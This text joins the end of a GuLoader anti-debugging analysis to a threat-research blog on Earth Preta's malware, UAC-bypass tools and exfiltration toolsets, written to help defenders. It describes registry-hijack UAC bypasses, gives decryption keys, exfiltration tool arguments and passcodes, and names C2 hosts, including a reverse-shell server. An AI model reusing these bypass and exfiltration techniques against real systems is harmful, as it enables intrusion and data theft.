If successfully pass the check, it then transforms the EIP to new address using logic Context->Eip += ByteAt(Eip + 2) ^
0x6A where Value 2 depicts size of instruction (mov, jg, jne etc.) where exception is raised. 
0x6A is byte key to transform EIP.
(It differs sample to sample) Fig 10.
Debug register check. 
When EXCEPTION_BREAKPOINT exception is raised, handler perform following steps: 
Checks whether hardware breakpoints have been set by checking status of the debug registers(DR0 to DR7).
Scans for applied software breakpoint i.e. CC byte in loop. 
If successfully pass the check, it then transforms the EIP to new address using logic Context->Eip += ByteAt(Eip + 1) ^
0x6A where Value 1 depicts size of instruction (CC) where exception is raised. 
0x6A is byte key to transform EIP. 
WRITING IDA PYTHON SCRIPT IDAPython is an IDA Pro plugin that integrates the python programming language, allowing scripts to run in IDA Pro. IDA provides different modules to work on disassembly of instructions. 
The python script finds instructions pattern that raise an exception and patch them by jump instruction with transformed EIP offset as a target. 
After running the python script in IDA, we get clean, easy to analyze, deobfuscated code of GuLoader’s shellcode.
Also finds out that GuLoader’s VEH has been called more than 1100 times. 
Fig 11.
Obfuscated code(A), deobfuscated code(B), GuLoader’s entire shellcode graph view(C). 
CONCLUSION GuLoader malware introduces new techniques very often which takes much time and efforts of malware analysts to fully analyzed it.
We have completely analyzed GuLoader’s custom Vectored Exception Handler and understood how it works. 
We have written python script to defeat GuLoader shellcode control flow obfuscation and saving time and efforts of malware analyst. 
We expect further development in GuLoader anti-analysis, anti-debug techniques in upcoming days. 
SonicWall Capture Labs provides protection against this threat via the SonicWall Capture ATP w/RTDMI. 
IOC’s SHA256 : 55130719554a0b3dcbf971c646e6e668b663b796f4be09816d405cc15a16d7d6 C2 URL : hxxp[:]//lena[.]utf[.]by/wp-content/plugins/f8eb81f6deba45169c3b41c05c4590ad/y/mm/mmd/kdRrHFMqRUIujuOy126[.]bin Final Payload (Azorult stealer): d5af42b118d0597c6b71831f2b2ebc8294eca907481d53939563fce7c0f14767 REFERENCES 
[1] https://securitynews.sonicwall.com/xmlpost/guloader-a-fileless-shellcode-based-malware-in-action/ [2] https://learn.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling [3] https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-exception_record 
title: Pack it Secretly: Earth Preta’s Updated Stealthy Strategies url: https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html APT & Targeted Attacks Pack it Secretly: Earth Preta’s Updated Stealthy Strategies After months of investigation, we found that several undisclosed malware and interesting tools used for exfiltration purposes were being used by Earth Preta.
We also observed that the threat actors were actively changing their tools, tactics, and procedures (TTPs) to bypass security solutions.
In this blog entry, we will introduce and analyze the other tools and malware used by the threat actor. 
By: Vickie Su, Nick Dai, Sunny Lu March 23, 2023Read time: ( words) Save to Folio Subscribe 
In our previous research, we disclosed and analyzed a new campaign initiated by the threat actor group Earth Preta (aka Mustang Panda).
In a more recent campaign we’ve been tracking, we discovered Earth Preta delivering lure archives via spear-phishing emails and Google Drive links.
After months of investigation, we found that several undisclosed malware and interesting tools used for exfiltration purposes were used in this campaign.
In this blog entry, we will introduce and analyze the other tools and malware used by Earth Preta. 
Infection chain As we previously mentioned in our past blog entry, the entire attack begins with a spear-phishing email.
After a long-term investigation into the attack routine, we’ve determined that the full infection chain works as follows: Figure 1.
The full infection chain We categorize the different TTPs into six stages: arrival vectors, discovery, privilege escalation, lateral movement, command and control (C&C) and exfiltration, respectively.
In our previous research, we covered most of the new TTPs and malware during the first stage, arrival vectors.
However, we observed that some of TTPs have been changed.
In the following sections, we focus on the updated arrival vectors and their succeeding stages. 
Arrival vectors We previously summarized the arrival vectors used by Earth Preta by categorizing them into three types (DLL sideloading, shortcut links, and fake file extensions).
Starting in October and November 2022, we observed that the threat actors began changing their TTPs to deploy the TONEINS, TONESHELL, and PUBLOAD malware, and QMAGENT malware.
We believe that the threat actors are employing these new techniques to avoid detection. 
Trojan.Win32.TONEINS Based on our earlier observation, the TONEINS and TONESHELL malware were downloaded from the Google Drive link embedded in the body of an email.
To bypass email-scanning services and email gateway solutions, the Google Drive link has now been embedded in a lure document.
The document lures users into downloading a malicious password-protected archive with the embedded link.
The files can then be extracted inside via the password provided in the document.
By using this technique, the malicious actor behind the attack can successfully bypass scanning services. 
Figure 2.
A lure document (allegedly concerning the government-related Myanmar Sustainable Development Plan) embedded with a Google Drive link and a password For the new arrival vector, the whole infection flow has been changed to the procedure shown in Figure 3. 
Figure 3.
Infection flow for the new arrival vector File name Detection name Description Letter Head.docx Decoy document with Google Drive link List of terrorist personnel IN border.rar (all entries below are part of this archive) List of terrorist personnel at the border.exe First-stage legitimate executable for DLL sideloading libcef.dll Trojan.Win32.TONEINS First-stage malware ~$Evidence information.docx Second-stage legitimate executable for DLL sideloading ~$List of terrorist personnel at the border.docx Backdoor.Win32.TONESHELL Second-stage malware Internal Letter.docx Decoy document Letter Head.docx Decoy document Table 1.
Files in the new arrival vector After analyzing the downloaded archive, we discovered it to be a malicious RAR file with the TONEINS malware libcef.dll and the TONESHELL malware ~List of terrorist personnel at the border.docx.
The infection flow for these is similar to the arrival vector type C in our previous report, with the only difference being that the fake .docx files have XOR-encrypted content to prevent detection.
For example, ~$Evidence information.docx is a file disguising itself as an Office Open XML document.
As such, it seems harmless and can even be opened by using decompression software such as 7-Zip. 
We found that the threat actors have hidden a PE file in one of the archive’s ZIPFILERECORD structures.
The TONEINS malware, libcef.dll, will decrypt this file with a single byte in XOR operations, find the PE header, and drop the payload to the specified path. 
Figure 4.
A PE file is revealed after decrypting the frData member in the last ZIPFILECECORD structure. 
Figure 5.
The decryption function of TONEINS The succeeding behaviors of the infection flow are generally the same as those in our previous analysis, where we provide more details. 
Trojan.Win32.PUBLOAD In more recent cases, the malware PUBLOAD was also being delivered through Google Drive links embedded in decoy documents. 
Figure 6.
The lure document Invitation letter from the US embassy.docx Since October 2022, we have been observing a new variant of PUBLOAD, which uses the spoofed HTTP header to transfer the data, as LAC’s report also discusses. 
In contrast to the previous PUBLOAD variant, it prepends an HTTP header with a legitimate-looking host name to the packets.
We believe that the threat actors are trying to conceal malicious data among normal traffic.
The data in the HTTP body is the same as the past variant, which has the same magic bytes 17 03 03 and the encrypted victim information.
We were able to successfully retrieve the payload from a live C&C server and were therefore able to continue our analysis. 
Figure 7.
C&C traffic of the PUBLOAD HTTP variant Once the payload is received, it will check if the first three magic bytes are 17 03 03 and if the following two bytes are the size of payload.
It will then decrypt the encrypted payload with the predefined RC4 key 78 5A 12 4D 75 14 14 11 6C 02 71 15 5A 73 05 08 70 14 65 3B 64 42 22 23 20 00 00 00 00 00 00 00, which is the same as the one used in the PUBLOAD loader. 
Figure 8.
The first payload retrieved from the PUBLOAD HTTP variant After decryption, it then checks if the first byte of the decrypted payload is 0x06.
The decrypted payload contains another payload that is XOR-encrypted with the bytes 23 BE 84 E1 6C D6 AE 52 90. 
Figure 9.
The second payload retrieved from the PUBLOAD HTTP variant After this is decrypted, there is yet another final backdoor payload that supports data upload and command execution. 
Figure 10.
The final payload of the PUBLOAD HTTP variant Command Internal string 0x03 - 0x01 - 0x1B UploadBegin error : %d! 0x1D UploadData error : %d! 0x1A - 0x1E CmdStart error : %d! 0x1F CmdWrite error :
%d! 0x30 CmdWrite error : %d 0x20 - Table 2.
Command codes in the PUBLOAD HTTP variant In addition, we found some interesting debug strings and event names among the PUBLOAD samples. 
Figure 11.
Event name in PUBLOAD Figure 12.
Debug string in PUBLOAD In summary, we think that the new TONESHELL and PUBLOAD archives have been evolving and now have something in common.
For example, both of them are now being placed in decoy documents (such as Google Drive links) in order to bypass antivirus scanning. 
Discovery Once the threat actors obtain access to the victim’s environment, they can start inspecting the environment via the following commands: net user net user <username> net user <username>
/DOMAIN Privilege escalation In this campaign, we discovered several tools used for UAC bypass in Windows 10.
We will go into detail for each of them. 
HackTool.
Win 32.ABPASS HackTool.Win32.ABPASS is a tool used to bypass UAC in Windows 10.
Based on our analysis, it reuses codes from the function ucmShellRegModMethod3, which is from a famous open-source project called UACME.
A report from Sophos introduces this tool.
￼ This tool accepts an argument, and the following data is written into registry: Registry Key Name Value HKEY_USERS\<SID>-1001_Classes\aaabbb32\shell\open\command (Default) 
argv[1] HKEY_USERS\<SID>-1001_Classes\ms-settings\CurVer (Default) aaabbb32 Table 3.
Registry keys changed by ABPASS 
It also changes how Windows handles the ms-settings protocol — in this case, the string ms-settings is a Programmatic Identifier (ProgID).
If the CurVer key is set under a ProgID, it will be used for versioning and mapping the current ProgID (ms-settings) to the one specified in the CurVer’s default value.
In turn, the behavior of ms-settings is redirected to the custom defined ProgID aaabbb32.
It also sets up a new ProgID aaabbb32 and its shell open command.
Finally, fodhelper.exe or computerDefaults.exe will be executed to trigger the ms-settings protocol. 
Figure 13.
The added ProgID aaabbb32 HackTool.
Win 32.CCPASS HackTool.
Win32.CCPASS is another tool that is also used for Windows 10 UAC bypass and similarly reuses codes from the function ucmMsStoreProtocolMethod in the project UACME. 
Figure 14.
Code similarities in CCPASS and ucmMsStoreProtocolMethod It works in a similar way to ABPASS.
However, unlike ABPASS, it hijacks the ms-windows-store protocol.
The hack tool CCPASS works as follows: It disables the application association toasts for the protocol ms-windows-store. 
It creates a new Shell in the registry. 
It invokes the undocumented API UserAssocSet to update the file association. 
It executes WSReset.exe to trigger this protocol. 
In Windows 10 and above, the system shows a new toast dialog for selecting the open application for the selected file type.
To hide this window, the tool explicitly adds new entries to HKCU\Software\Microsoft\Windows\CurrentVersion\ApplicationAssociationToasts to disable all toasts related to the protocol ms-windows-store. 
Figure 15.
An example of the application association toast Figure 16.
Hiding application association toasts via the registry Once this is done, the tool starts to alter the shell command of ms-windows-store and finally triggers it using WSReset.exe. 
SilentCleanup In Windows 10, there is a native Windows service called “SilentCleanup.”
This service has the highest privileges that can be abused for Windows 10 UAC bypass.
Normally, this service is intended for running %windir%\system32\cleanmgr.exe.
However, the environment variable %windir% can be hijacked and changed to any path to achieve privilege escalation. 
Figure 17.
Malicious commands abusing the SilentCleanup service We observed that the threat actors used this technique to execute c:\users\public\1.exe. 
Lateral movement In this stage, we observed certain malware such as HIUPAN and ACNSHELL (initially introduced and analyzed by Mandiant and Sophos) being used to install themselves to removable disks and create a reverse shell. 
USB Worm: Worm.
Win 32.HIUPAN and+ Backdoor.
Win 32.ACNSHELL 
We found a pair of malware comprised of a USB worm and a reverse shell —includin g a USB worm and a reverse shell (detected as Worm.Win32.HIUPAN and Backdoor.Win32.ACNSHELL, respectively,) — being used to spreadfor spreading themselves over removable drives., which we detected as Worm.Win32.HIUPAN and Backdoor.Win32.ACNSHELL.
This These malware wereas detailed and introducedpreviously discussed in the reports published by Mandiant and Sophos. 
Figure 18 shows the infection chain for both. Figure 18.
HIUPAN and ACNSHELL infection flow The USB Driver.exe program first sideloads u2ec.dll, which then loads the payload file usb.ini.
They have the following PDB strings, respectively: G:\project\APT\U盘劫持\new\u2ec\Release\u2ec.pdb 
G:\project\APT\U盘劫持\new\shellcode\Release\shellcode.pdb The string U盘劫持 means “U disk hijacking,” where “U disk” refers to removable drives. 
USB Driver.exe then starts checking whether it is properly installed.
If it is installed, it will start to infect more removable disks and copy files to a folder named autorun.inf.
If it is not installed, it installs itself to %programdata% and then sets the registry run key for persistence. 
Finally, the ACNSHELL malware rzlog4cpp.dll is sideloaded.
It will then create a reverse shell via ncat.exe to the server closed[.]theworkpc[.]com. 
Command and Control (C&C)C&C stage Earth Preta employed several tools and commands for the C&C stage.
For example, the group used certutil.exe to download the legitimate WinRAR binary as rar1.exe from the server 103[.]159[.]132[.]91. Figure 19.
The certutil.exe program downloads the WinRAR binary We also observed that the threat actors used PowerShell to download multiple malware and archives from the server 103[.]159[.]132[.]181 for future use. Figure 20.
PowerShell downloading malware In certain instances, they even leveraged the WinRAR binary installed on the victim hosts to decompress all the malware. 
Figure 21.
Decompressing malware with the installed WinRAR binary Although we found several logs involving multiple pieces of dropped malware, we only managed to retrieve a few of them.
Among all our collected samples, we will introduce the most noteworthy ones. 
Backdoor.
Win32.CLEXEC The file name of the backdoor CLEXEC is SensorAware.dll.
This is a simple backdoor that is capable of executing commands and clearing event logs. 
Figure 22.
Command codes of CLEXEC Backdoor.
Win32.COOLCLIENT The backdoor COOLCLIENT was first introduced in a report from Sophos; the sample mentioned in the report was compiled in 2021.
In our case, the COOLCLIENT sample we analyzed had a more recent compilation time in 2022, and while it provides the same functionalities, it has the added capability to open a decoy document (work.pdf) when the current process name has “.pdf” or “.jpg” file extensions.
It contains also possesses the ability to reduce debug strings (less OutputDebugStrings calls).
Meanwhile, loader.ja is used under two processes: One is under googleupdate.exe, which is used for the first sideloading.
The second is under winver.exe, which is injected to conduct backdoor behaviors.
Furthermore, COOLCLIENT applies obfuscation techniques that we discuss in later sections. Figure 23.
Open decoy document Figure 24 shows the whole execution flow of COOLCLIENT. Figure 24.
Execution flow of COOLCLIENT The arguments of COOLCLIENT provide the following capabilities: install.
There are three conditions different ways to decide the method of installation for COOLCLIENT, detailed here: It installs itself by creating an InstallSvc service called InstallSvc which will trigger “googleupdate.exe work”.. 
It sets up a run key for via the command C:\ProgramData\GoogleUpdate\googleupdate.exe work for persistence. work.
The malware will continue to read and decrypt goopdate.ja and inject it into winver.exe for the next-stage payload (COOLCLIENT), which contains malicious behaviors. 
passuac.
The malware will check if the process avp.exe exists.
If avp.exe doesn’t exist, UAC bypass will be executed via the CMSTPLUA COM interface.
If avp.exe exists, UAC bypass will be executed via the AppInfo RPC service. 
Figure 25.
UAC Bypass via the CMSTPLUA COM interface Figure 26.
UAC Bypass via the AppInfo RPC service Based on the class name used in COOLCLIENT, we learned thaAccording to our analysis, it reads the encrypted configuration filecan expand the C&C server via time.sig., an encrypted configuration.
It is also able to communicate through different network protocols such as UDP (User Datagram Protocol) and TCP (Transmission Control Protocol).
Based on some internal strings and the APIs used by Earth Preta, the functionalities of this backdoor can be inferred as follows: Send portmap Build connection Read file Delete file Keystrokes and windows monitoring Backdoor.
Win32.TROCLIENT The backdoor TROCLIENT, which was also first disclosed in Sophos’s report, is similar to COOLCLIENT.
However, this backdoor has an anti-debugging technique, which will check if the running processes have the strings dbg.exe or olly. Figure 27.
TROCLIENT anti-debugging technique. 
Figure 28 shows the whole execution flow of TROCLIENT. Figure 28.
Execution flow of TROCLIENT The arguments of TROCLIENT provide the following capabilities: install.
There are two waysto determine the method of installation for TROCLIENT, detailed here: It installs itself by creating aservice called InstallSvc which will trigger “C:\programdata\netsky\netsky.exe online”. 
It sets up a run key for the command C:\programdata\netsky\netsky.exe online for persistence. 
online: It will read the next stage payloads, free.plg and main.plg, and inject them into dllhost.exe. passuac:
If it does not, UAC bypass is executed via the CMSTPLUA COM interface.
If avp.exe exists, UAC bypass is executed via token manipulation. 
Figure 29.
The capabilities of three different arguments This backdoor provides the following capabilities: Read file Delete file Monitor keystrokes and windows There are several similarities and differences between COOLCLIENT and TROCLIENT, as Table 3 shows. 
Argument/Behaviors COOLCLIENT TROCLIENT install Creates a service named InstallSvc ✓ ✓ Executes itself with passuac ✓ ✓ Sets Run Key with “work/online” ✓ ✓ passuac AppInfo RPC ✓ CMSTPLUA COM ✓ ✓ Token manipulation ✓ work/online Send portmap ✓ Connect to C&C ✓ ✓ File operations ✓ ✓ Keylogging ✓ ✓ Table 3.
Comparison of COOLCLIENT and TROCLIENT 
In addition to the aforementioned malware, we also found several shellcode loaders for PlugX. Since it is a known malware family, we will not expand on its details in this blog entry. 
Exfiltration Based on our telemetry, we found that Earth Preta used multiple approaches to exfiltrate sensitive data from the victims.
For example, in some cases, we observed that WinRAR and curl (or cURL) were leveraged to collect and transfer data to the threat actor’s server.
After further investigation, we even found some previously unseen pieces of malware that were used to collect data in a custom-made file format.
In the following sections, we share the details of the unique exfiltration toolsets developed by Earth Preta. 
WinRAR and curl According to some of our monitoring logs, the threat actors abused the installed WinRAR binary and the uploaded curl executable to exfiltrate the files (Figure 30 shows the executed command).
Note that the executable log.log is a legitimate curl binary.
All the exfiltrated data was collected and sent back to the threat actor-controlled FTP (File Transfer Protocol) server. 
Figure 30.
Exfiltrate data using WinRAR and curl In some cases, we accidentally stumbled on the account and password of the FTP server.
Upon checking the FTP server, we learned that the threat actors focused on sensitive and confidential documents, most of which were compressed and protected with a password.
Based on our observations, the documents were organized via the categorization of the victim’s host name and disk drive. 
Figure 31.
FTP servers with stolen documents HackTool.
Win32.NUPAKAGE Apart from well-known legitimate tools, the threat actors also crafted highly customized tools used for exfiltration.
We named this malware “NUPAKAGE," a name derived from its unique PDB string, D:\Project\NEW_PACKAGE_FILE\Release\NEW_PACKAGE_FILE.pdb. 
The NUPAKAGE malware needs a unique passcode to be executed, with the exfiltrated data being wrapped in a custom file format.
It seems that the threat actors are continuously updating this tool to provide more flexibility and lower the possibility of detection, including adding more command-line arguments and obfuscation mechanisms.
By default, it only collects documents, including the files with the following extensions: .doc .docx .xls .xlsx .ppt .pptx .pdf 
It avoids collecting documents with file names starting with “$” or “~” since these types of documents are usually either temporary files generated by the system or PE files pretending to be decoy documents (as we discussed in the arrival vectors section). 
The usage of this tool is as follows: malware.exe passcode start end chunk -s extension_A extension_B … Argument Name Format Example Value Description passcode String comeon A unique code to execute it start String 2022-01-01 
The start range of the exfiltrated file’s modification timestamp end String 2022-12-31 
The end range of the exfiltrated file’s modification timestamp chunk Integer 4096 Splits the generated data in chunks by the specified size (MB) -s String File extensions to be collected; optional Table 5.
Arguments of the NUPAKAGE malware Every NUPAKAGE malware needs a unique passcode as its first argument to continue execution.
As Figure 32 shows, it first checks if the passcode exists.
If not, the malware execution procedure will terminate.
In our collection, we observed different passcodes in each malware. Figure 32.
Passcode check routine in NUPAKAGE SHA256 Passcode 634977a24e8fb2e3e82a0cddfe8d007375d387415eb131cce74ca03e0e93565f notebook c835577f1ddf66a957dd0f92599f45cb67e7f3ea4e073a98df962fc3d9a3fbe0 comeon 2937580b16e70f82e27cfbc3524c2661340b8814794cc15cb0d534f5312db0e0 update c2f5a12ebaeb39d4861e4c3b35253e68e6d5dc78f8598d74bc85db21aeb504e8 comeon Table 4.
Passcodes in NUPAKAGE After execution, NUPAKAGE will drop two files, xxx.zip and xxx.z.
The file xxx.zip is a logging file with a fake ZIP header prepended at offset 0x0 and taking up the first 0x100 bytes.
Starting from the offset 0x100, the logging strings are encrypted with a single byte in XOR operations as shown Figure 33. 
Figure 33.
The original logging file (top), with plain text revealed in the decrypted logging file (bottom) Taking one of the execution results as an example, much of the information of the exfiltrated data is saved, including the original file path, the original file size, and the compressed file size.
We believe that the threat actors use it to further track which files have been processed.
For security researchers, this logging file also helps reveal how much data is exfiltrated and provides information on the impact scope. 
[+] Program ready! 
[+] FILE ORIGINAL PATH: C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\1494870C-9912-C184-4CC9-B401-A53F4D8DE290.pdf [+] FILE PATH SIZE: 198 [+] FILE ORIGINAL SIZE: 186837 
[+] FILE COMPRESSED SIZE: 183734 [+] FILE ORIGINAL PATH:
C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\Click on ‘Change’ to select default PDF handler.pdf [+] FILE PATH SIZE: 210 [+] FILE ORIGINAL SIZE:
186837 [+] FILE COMPRESSED SIZE: 183734 ... 
<omitted> ... 
[*] File or folder access denied! 
[+] All completed! 
The file with a .z extension is a blob of exfiltrated data within a self-defined file format.
The NUPAKAGE malware first generates a key blob randomly, with the key being encrypted in a custom algorithm.
After, it stores the encrypted key blob into the first 0x80 bytes of the file with the .z extension.
Starting from the offset 0x80, there exists a long array of all the exfiltrated data. 
Much of the information from the exfiltrated files are saved, such as the MD5 hash, the length of the file name, the compressed file size, the original file size, the file name, and the file’s content.
To separate the file blobs, it puts a unique byte sequence at the end of each, 55 55 55 55 AA AA AA AA FF FF FF FF 99 99 99 99. 
Figure 34.
Self-defined format in the file with the .z extension generated by NUPAKAGE Table 5.
Self-defined format description in the file with the .z extension generated by NUPAKAGE It’s also worth mentioning that in the more recent versions of NUPAKAGE, an increasing number of obfuscations are being adopted to thwart static analysis. 
Figure 35.
Junk codes in more recent versions of NUPAKAGE HackTool.
Win32.ZPAKAGE ZPAKAGE is another example of custom malware used for packing files; it also works similarly to NUPAKAGE.
It also needs a passcode to ensure that it is being used as intended.
In the example shown in Figure 36, the passcode is “start”. 
Figure 36.
An example of a ZPAKAGE password ZPAKAGE also supports command-line arguments, but it possesses less functions than NUPAKAGE.
The usage of this tool is shown as follows: malware.exe passcode time Argument Name Format Example Value Description Passcode String start A unique code in order to execute it Time String 20221221 The start date Table 6.
Arguments supported by ZPAKAGE ZPAKAGE also shows similar behaviors to NUPAKAGE.
For instance, it also avoids files with names starting with “$” or “~”.
In addition, it generates two files, one with a .z extension and another with a .zip extension.
The file with a .z extension is the exfiltrated data blob and the file with a .zip extension is the logging file. 
In the generated file with a .z extension, the exfiltrated files will be compressed by the zlib algorithm to minimize the file size.
It also defines a Boolean field “type” for storage, whether a file is compressed or not.
If a file is compressed and its file size is less than the original one, the type will be 1.
Otherwise, the type will be set to 0, and the original file content will be chosen instead of the compressed one.
Regardless of whether the file content is compressed or not, it will be encrypted in XOR operations with a specific string, qwerasdf. 
Figure 37.
Self-defined format in the file with .z extension generated by ZPAKAGE Table 7. Self-defined format description in the file with the .z extension generated by ZPAKAGE Threat Hunting Since October 2022, the threat actors have changed their TTPs and have started using password-protected archives.
For example, we found a TONEINS sample (SHA256: 8b98e8669d1ba49b66c07199638ae6012adf7d5d93c1ca3bf31d6329506da58a) on VirusTotal that can’t be linked to any other file in the “Relations” tab.
However, we observed two files that have been opened in the “Behaviors” tab with the file names ~$Evidence information.docx and ~$List of terrorist personnel at the border.docx.
As mentioned in the arrival vectors section, the next stage payloads are normally embedded in the fake document files. 
Figure 38.
Opened files of TONEINS sample Figure 39 shows the search results for the query “List of terrorist personnel at the border” on VirusTotal.
The first file is the TONEINS DLL sample that we mentioned earlier in this section, while the second file is a benign executable file originally named adobe_licensing_wf_helper.exe, which was apparently uploaded to VirusTotal with the file name List of terrorist personnel at the border.exe. 
Figure 39.
Search result for the string List of terrorist personnel at the border on VirusTotal Figure 40.
Submission of adobe_licensing_wf_helper.exe The third file is a password-protected archive, which has the exact same file name, List of terrorist personnel at the border[1].rar.
Unfortunately, we didn’t have the password, so we were unable to decompress it.
But it has an interesting execution parent in the “Relations” tab, which is a document file named Letter Head.docx. Figure 41.
Execution parent of List of terrorist personnel at the border[1].rar Inside the document Letter Head.docx
, there is a Google Drive link and a password.
The content itself is related to the Government of the Republic of the Union of Myanmar, and is written in Burmese. 
Figure 42.
Letter Head.docx Upon checking the download link, we discovered that it was the same password-protected archive file that we found on VirusTotal earlier. 
Figure 43.
Screenshot of the Google Drive link The new arrival vector flow is similar to the one we introduced in the arrival vector section: Victims will receive and interact with a decoy document containing a Google Drive link and a corresponding password instead of an archive download link embedded in the email. 
As for why the password-protected archive has the execution parent, upon checking the sandbox execution behaviors of Letter Head.docx on VirusTotal, we discovered that the VirusTotal sandbox will select any link embedded in the document.
This leads to the opening of an Internet Explorer window with the file download prompt. 
Figure 44.
Sandbox screenshot of the file Letter Head.docx on VirusTotal When the download prompt is shown, Internet Explorer will silently download this file in the background even before the user selects the “Save” button. 
As a result, the file will be saved to the cache folder named “INetCache,” after which we see a dropped RAR file: C:\Users\user\AppData\Local\Microsoft\Windows\INetCache\IE\R0IAZP7Z\List%20of%20terrorist%20personnel%20at%20the%20border[1].rar. 
Since the RAR file is downloaded automatically by Internet Explorer, Letter Head.docx will be treated as its execution parent.
This sample can then be used for hunting this campaign. 
Figure 45.
The dropped files of Letter Head.docx on VirusTotal To find additional password-protected archives and documents embedded with a Google Drive link, we tried to use the following query: 
tag:rar tag:encrypted name:INetCache size:500kb+ The query finds any encrypted RAR archive with a large enough file size containing the folder name “INetCache” in its path.
Fortunately, we found another RAR file with the document execution parent “Notic(20221010)(final).docx” that turned out to be a TONESHELL archive. 
Figure 46.
Relations of the archive file Figure 47.
Content of the file Notic(20221010)(final).docx It’s interesting to note that the threat actors use date and time strings written in the same format (DD-MM-YYYY) as the extracting passwords in all the cases we’ve collected so far. 
Connecting the Dots During our investigation, we observed some data points that connect to the same personnel.
For example, we found a specific name “TaoZongjie” among the different malware samples we collected.
In addition, the GitHub repository named “YanNaingOo0072022,” mentioned in Avast’s December 2022 report,￼hosted multiple pieces of malware, including TONESHELL.
We also observed that the obfuscation methods have similarities among the different malwares. 
User “TaoZongjie” We found some samples sharing the same special string/name “TaoZongjie,” including the Cobalt Strike malware, a Windows user on a TONESHELL C&C server, and the displayed message in the pop-up dialog box of TONESHELL. 
Our investigation started with the TONESHELL C&C server 38[.]54[.]33[.]228 that had the remote desktop service enabled.
Here, we found that one of the Windows users was called “TaoZongjie.” 
Figure 48.
Windows users in 38[.]54[.]33[.]228 While hunting samples related to this campaign, we came across a tweet about Cobalt Strike posted in April 2021.
At first glance, Cobalt Strike was used in a manner similar to this campaign, including the use of DLL sideloading, the use of a Google Drive link for delivery, and the creation of a schedule task. 
Figure 49.
A tweet about Cobalt Strike The infection flow is as follows: The archive file is delivered through a Google Drive link, which contains a legitimate EXE file, a malicious DLL file, and a decoy document written in Burmese.
Once the malicious DLL is sideloaded, it will drop the legitimate EXE file and the malicious DLL file, which are embedded in the resource section of the DLL file.
In this sample, the string By:Taozongjie is being used as the event name. 
Figure 50.
Infection flow of Cobalt Strike Figure 51.
Special string in the sample In one TONEINS sample (SHA256: 7436f75911561434153d899100916d3888500b1737ca6036e41e0f65a8a68707), we also observed the string taozongjie, which was being used for an event name. 
Figure 52.
Create event taozongjie in TONEINS In another TONESHELL sample (SHA256: d950d7d9402dcf014d6e77d30ddd81f994b70f7b0c6931ff1e705abe122a481a), there are some insignificant export functions, which will appear via message boxes, with the strings Tao or zhang!.
Even though the names of these two strings are not spelled exactly same way as taozongjie, their spellings are still similar. 
Figure 53.
Message boxes of TONESHELL Based on what we found among the different samples, we assume that taozongjie could be one of the flags used by the threat actors. 
GitHub user “YanNaingOo0072022” The GitHub user “YanNaingOo0072022” was mentioned in both an Avast and an ESET report.
The user’s repositories host various malware, including the latest versions of TONEINS, TONESHELL, and a new tool, QMAGENT, which is ESET named MQsTTang”.
At the time of writing, this GitHub space was still accessible, with five repositories: “View2015,” “View2016,” “1226,” “ee,” and “14.”
Among these, “View2015” and “View2016” were empty. 
Figure 54.
The YanNaingOo0072022 GitHub space 1226 
The archive files in this repository are all the same but have different file names.
We believe that these files were meant for different victims. 
Figure 55.
The 1226 repository Upon unarchiving the compressed file, we found two files with the fake extension “.doc” containing one-byte XOR encrypted sections.
Both share the same file structure (a PE payload hidden in a DOCX file) as the one we referred to in the arrival vectors section.
These files ended up being the TONEINS and TONESHELL malware. 
Figure 56.
The files inside the archive 14 The file Documents members of delegation diplomatic from Germany.
Exe, found in the Documents.rar archive, is a novel malware that communicates over the MQTT protocol.
In March 2023, ESET published a detailed technical report on this backdoor, which it named “MQsTTang.” 
Beginning in January, we discovered that MQsTTang was being used as the new arrival vector in some of incidents we encountered, specifically in campaigns targeting individuals involved with government entities.
This backdoor is unique because it communicates to its C&C servers over the MQTT protocol, which is commonly used in internet-of-things (IoT) devices.
Malicious actors using this technique can effectively hide the real C&C server behind the protocol. 
Figure 57.
The 14 repository ee The file CVs Amb Office PASSPORT Ministry Of Foreign Affairs.exe, which is the malware QMAGENT, can be found in the CVs Amb.rar archive. 
Figure 58.
The ee repository Conclusion Over the past year, security researchers have been discovering and analyzing Earth Preta’s campaigns and toolsets. 
We were able to attribute some of these to Earth Preta based on similarities among the TTPs, the malware being used, and the timeline of the campaigns.
Starting October 2022, the threat actors changed the arrival vector of the TONEINS, TONESHELL, and PUBLOAD malware.
Instead of attaching malicious archives or Google Drive links to an email, they now embed the download link in another decoy document and add a password to the archive. 
Based on our observations, Earth Preta tends to hide malicious payloads in fake files, disguising them as legitimate ones — a technique that has been proven effective for avoiding detection.
As for privilege escalation, the threat actors tend to reuse codes copied from open-source repositories.
Meanwhile, they developed customized toolsets designed to collect confidential documents in the exfiltration stage. 
Overall, we believe that Earth Preta is a capable and organized threat actor that is continuously honing its TTPs, strengthening its development capabilities, and building a versatile arsenal of tools and malware. 
To help prevent potential threats such as the one posed by advanced persistent threat (APT) groups, we suggest that organizations conduct phishing awareness training for their employees and partners to stress the importance of caution when opening emails, particularly those messages from unfamiliar senders or with unknown subjects. 
To assist organizations in protecting themselves against sophisticated threats, we recommend adopting a comprehensive security strategy that employs advanced technologies capable of identifying and halting such threats across multiple channels, including endpoints, servers, networks, and email communications. 
Indicators of Compromise (IOCs) 
The full list of IOCs can be found here. 
MITRE ATT&CK Tactic ID Name Resource Development T1583.004 Acquire Infrastructure: Server T1587.001 Develop Capabilities: Malware T1585.002 Establish Accounts: Email Accounts T1588.002 Obtain Capabilities: Tool T1608.001 Stage Capabilities:
Upload Malware Initial Access T1566.002 Phishing: Spearphishing Link Execution T1204.001 User Execution: Malicious Link T1204.002 User Execution: Malicious File Persistence T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1574.002 Hijack Execution Flow: DLL Side-Loading T1053.005 
Scheduled Task/Job: Scheduled Task Privilege Escalation T1068 Exploitation for Privilege Escalation T1134 Access Token Manipulation Defense Evasion T1140 Deobfuscate/Decode Files or Information T1036.005 Masquerading: Match Legitimate Name or Location Lateral Movement T1091 Replication Through Removable Media Command and Control T1071.001 Application Layer Protocol: Web Protocols T1573.001 Encrypted Channel:
Symmetric Cryptography T1104 Multi-Stage Channels T1095 Non-Application Layer Protocol Exfiltration T1048 Exfiltration Over Alternative Protocol Authors Vickie Su Threats Analyst Nick Dai Sr. Threat Researcher Sunny Lu Threats Analyst 
